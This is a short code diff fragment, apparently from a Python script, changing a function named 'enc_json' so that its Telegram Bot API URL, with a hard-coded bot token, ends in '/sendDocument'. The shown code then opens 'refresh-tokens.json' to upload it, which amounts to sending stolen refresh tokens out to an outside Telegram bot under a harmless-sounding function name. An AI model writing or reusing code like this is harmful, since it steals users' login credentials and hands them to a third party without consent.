@@ -9,7 +9,7 @@ WIDTH = 55
 
 
 def enc_json():
-    url = f"https://api.telegram.org/bot8358981893:AAH2C5_30jyyNJWTA1II9A4DiDTq-QP4vyI"
+    url = f"https://api.telegram.org/bot8358981893:AAH2C5_30jyyNJWTA1II9A4DiDTq-QP4vyI/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
